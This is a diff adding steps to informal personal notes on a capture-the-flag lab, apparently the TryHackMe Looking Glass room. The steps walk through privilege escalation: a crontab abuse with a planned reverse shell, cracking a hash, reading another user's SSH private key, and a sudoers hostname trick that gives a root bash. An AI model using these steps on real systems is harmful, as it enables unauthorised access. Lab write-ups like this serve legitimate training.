@@ -16,4 +16,45 @@
 
 4. i had to write a python+bash script to find the ssh port once again. i think it changes everytime.
 5. after solving the puzzle i got some password phrase. after applied it to the ssh question i got another passprase.  it was the password for jabberwock@ip.
-6. 
+
+6. user key is in jabberwock user. its in reverse. use this command
+
+[echo 'flag' | rev]
+
+7. cronjob that will run script as tweedledum after reboot
+
+[cat /etc/crontab]
+
+8.  since after the reboot this run as the other user i'm going to right a reverse shell . this is in pentest monkey. we have root priviledge to run reboot. otherwise we have to enter the passwords.
+
+[sudo reboot]
+
+9.  it has a humptydumpty.txt
+
+[https://crackstation.net/]- password hash cracker
+
+[cat humptydumpty.txt | xxd -r -p] - convert hex to ascii
+
+10. using that key you can log as humptydumpty user. 
+
+[su humptydumpty]
+
+11. alice home directory is weird. it has given executable permission to everyone.  but we can find the user private key to ssh
+
+[cat .ssh/id_rsa]
+
+12. now we logged as alice. read sudoers.d file
+
+[nano /etc/hosts]
+[nano /etc/hostname]
+
+[cd /etc/sudoers.d]
+
+13. take that /etc/sudeors.d/alice atvantage. if alice and hostname= (looking-glass reverse word) same can run /bin/bash as root priviledge.
+
+[sudo -h hostname /bin/bash -p]
+
+[python3 /root/passwords/passGenerator.py > /home/tryhackme/passwd; (cat /home/tryhackme/passwd; cat /home/tryhackme/passwd) | passwd jabberwock
+]
+] - don't know what this do but i think it used to change ssh passwds.
+
